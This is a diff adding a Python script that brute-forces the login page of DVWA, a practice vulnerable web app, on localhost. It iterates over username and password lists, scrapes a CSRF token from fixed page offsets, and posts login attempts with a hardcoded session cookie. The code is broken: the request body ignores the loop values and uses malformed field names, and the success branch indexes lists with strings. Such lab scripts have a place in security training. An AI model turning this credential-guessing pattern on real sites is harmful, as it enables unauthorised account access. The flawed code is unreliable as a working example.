@@ -1,0 +1,37 @@
+import http.client
+import urllib.parse
+import urllib.request
+
+print("-- This prograrm will try to bypass the login page of DVWA through a usermane and password dictionary --\n")
+
+
+host = "127.0.0.1"
+port = 80
+url = "/DVWA-master/login.php"
+username = ["administrator","admins","admin"]
+password = ["pass","admin","password"]
+
+headers={"Host":"127.0.0.1","User-Agent":"Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0","Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8","Accept-Language":"en-US,en;q=0.5","Referer":"http://127.0.0.1/DVWA-master/login.php","Cookie":"security=impossible; PHPSESSID=f240shufukh3vgul13csp6h5v2","Connection":"close","Content-Type":"application/x-www-form-urlencoded","Content-Length":88}
+
+try:
+    for i in username:
+        for k in password:
+            connection = http.client.HTTPConnection(host,port)
+            connection.request('GET', url)
+            response = connection.getresponse()
+            html= response.readlines()
+            line=str(html[46])
+            CSRF_token=line[50:82]
+            connection = http.client.HTTPConnection(host, port)
+            body = urllib.parse.urlencode({'username=':'admin','password=':'password','Login=':'Login',"user_token":CSRF_token})
+            connection.request('POST', url, body, headers)
+            response = connection.getresponse()
+            loc = response.getheader('Location')
+            if(loc == "index.php"):
+                un=username[i]
+                pas=password[k]
+                print("Brute Force was a success and the credintials are\nUsername: "+un+"Password: "+pas)
+except ConnectionRefusedError:
+    print("Unable to connect")
+connection.close()
+
